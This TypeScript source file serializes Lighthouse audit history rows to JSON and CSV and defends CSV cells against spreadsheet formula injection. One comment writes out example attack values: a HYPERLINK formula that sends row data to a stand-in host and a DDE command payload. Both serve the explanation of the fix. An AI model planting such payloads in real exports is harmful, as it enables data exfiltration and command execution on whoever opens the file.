/**
 * Pure export serializers (PRD §6 Phase 7 — export).
 *
 * Turns the {@link HistoryRow}s the History / Batch views already hold into
 * downloadable **JSON** and **CSV**. The exported shape is a flat, analysis-
 * friendly projection (one object/row per run): the requested + final URL, the
 * device, status, every category score, the six Core Web Vitals (numeric),
 * timing/version metadata, and any error message. Heavy raw LHRs are *not*
 * included — those stay one click away via the per-run report endpoint.
 *
 * Runtime- and DOM-free (only a `HistoryRow` *type* import, erased at compile)
 * so it is unit-testable in the node test env and safe to import into client
 * components. The browser-only file download lives in `./download.ts`.
 */

import type { HistoryRow } from "@/lib/db/persistence";
import {
  type LighthouseCategory,
  LIGHTHOUSE_CATEGORIES,
  type MetricId,
} from "@/lib/lighthouse/types";
import { METRIC_DISPLAY_ORDER, METRIC_META } from "@/lib/scores";

/** One flattened run, the canonical export record (stable key order). */
export interface ExportRecord {
  url: string;
  finalUrl: string | null;
  device: string;
  status: "done" | "error";
  runs: number | null;
  performance: number | null;
  accessibility: number | null;
  "best-practices": number | null;
  seo: number | null;
  /**
   * Lighthouse 13.3's fifth category. Appended after `seo` (the canonical
   * `LIGHTHOUSE_CATEGORIES` order) so an existing consumer's column positions
   * are unchanged. `null` — an empty CSV cell — whenever the run didn't score
   * it, including every row persisted before the category existed.
   */
  "agentic-browsing": number | null;
  /** Core Web Vitals numeric values keyed by abbreviation (LCP, CLS, …). */
  lcp: number | null;
  cls: number | null;
  tbt: number | null;
  fcp: number | null;
  si: number | null;
  tti: number | null;
  fetchTime: string | null;
  createdAt: string;
  errorMessage: string | null;
}

/** abbr (lower-cased) → metric id, in PRD display order — for the CWV columns. */
const METRIC_COLUMNS: ReadonlyArray<{ key: keyof ExportRecord; id: MetricId }> =
  METRIC_DISPLAY_ORDER.map((id) => ({
    key: METRIC_META[id].abbr.toLowerCase() as keyof ExportRecord,
    id,
  }));

/** Project a {@link HistoryRow} into the flat {@link ExportRecord}. */
export function toExportRecord(row: HistoryRow): ExportRecord {
  const metric = (id: MetricId): number | null =>
    row.metrics?.[id]?.numericValue ?? null;
  const score = (c: LighthouseCategory): number | null => row.scores[c] ?? null;

  return {
    url: row.url,
    finalUrl: row.finalUrl,
    device: row.formFactor,
    status: row.status,
    runs: row.runs,
    performance: score("performance"),
    accessibility: score("accessibility"),
    "best-practices": score("best-practices"),
    seo: score("seo"),
    "agentic-browsing": score("agentic-browsing"),
    lcp: metric("largest-contentful-paint"),
    cls: metric("cumulative-layout-shift"),
    tbt: metric("total-blocking-time"),
    fcp: metric("first-contentful-paint"),
    si: metric("speed-index"),
    tti: metric("interactive"),
    fetchTime: row.fetchTime,
    createdAt: row.createdAt,
    errorMessage: row.errorMessage,
  };
}

/** Serialize runs to pretty-printed JSON (array of {@link ExportRecord}). */
export function rowsToJson(rows: HistoryRow[]): string {
  return JSON.stringify(rows.map(toExportRecord), null, 2);
}

/**
 * Ordered CSV columns: the scalar fields first, then the category scores (in
 * `LIGHTHOUSE_CATEGORIES` order, so a new category appends rather than
 * reshuffles) + the six CWVs.
 */
const CSV_COLUMNS: ReadonlyArray<keyof ExportRecord> = [
  "url",
  "finalUrl",
  "device",
  "status",
  "runs",
  ...LIGHTHOUSE_CATEGORIES,
  ...METRIC_COLUMNS.map((m) => m.key),
  "fetchTime",
  "createdAt",
  "errorMessage",
];

/**
 * Characters that make a spreadsheet treat a cell as a FORMULA rather than text.
 *
 * `=`, `+`, `-` and `@` are the classic four; the two control characters are the
 * bypass that makes a naive prefix check useless, because Excel strips a leading
 * tab or carriage return and then re-reads the `=` behind it.
 */
const FORMULA_LEADERS = /^[=+\-@\t\r]/;

/**
 * Escape one CSV cell per RFC 4180: wrap in quotes (and double interior quotes)
 * when the value contains a comma, quote, or newline. `null` → empty cell.
 *
 * It also defuses CSV FORMULA INJECTION, which RFC 4180 has nothing to say about.
 * A cell beginning `=`, `+`, `-`, `@`, tab or CR is executed as a formula by
 * Excel, LibreOffice and Google Sheets on open — so a value like
 * `=HYPERLINK("https://evil.test?"&A1,"click")` exfiltrates the row it sits in,
 * and `=cmd|'/c calc'!A1` is the DDE variant. The values here are not all ours:
 * `finalUrl` is chosen by whatever the audited site redirects to, and
 * `errorMessage` can carry text derived from the page.
 *
 * The fix is a leading apostrophe, which every major spreadsheet reads as
 * "treat the rest as text" and strips on display.
 *
 * **Be precise about the cost, because the obvious claim is wrong.** This is NOT
 * lossless: the apostrophe sits inside the quotes, so it is part of the field,
 * and an RFC 4180 parser reads `=SUM(A1)` back as `'=SUM(A1)`. A leading `-`
 * gets the same treatment, so a negative number in a future column would export
 * as spreadsheet TEXT rather than a number. No column today is negative-numeric
 * (`ExportRecord` is urls, statuses, 0–100 scores and timings), so nothing is
 * harmed now — but a column that could be must either be exempted here or accept
 * the prefix. The trade is deliberate: a mangled value a human can see beats a
 * formula that runs on open. Prefixing rather than substituting is still the
 * right shape, because the original characters all survive.
 *
 * ROADMAP Phase A's security review raised this and left it, correctly, as
 * pre-existing and untouched by that phase. Phase F is the phase that makes it
 * live: `--reporter csv` writes a file that a CI pipeline archives and a human
 * later opens in a spreadsheet, which is exactly the path the attack needs.
 */
export function csvCell(value: string | number | null): string {
  if (value === null) return "";
  const text = String(value);
  if (FORMULA_LEADERS.test(text)) {
    return `"'${text.replace(/"/g, '""')}"`;
  }
  return /[",\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
}

/** Serialize runs to a CSV document (header row + one row per run, CRLF lines). */
export function rowsToCsv(rows: HistoryRow[]): string {
  const header = CSV_COLUMNS.join(",");
  const lines = rows.map((row) => {
    const record = toExportRecord(row);
    return CSV_COLUMNS.map((column) => csvCell(record[column])).join(",");
  });
  return [header, ...lines].join("\r\n");
}
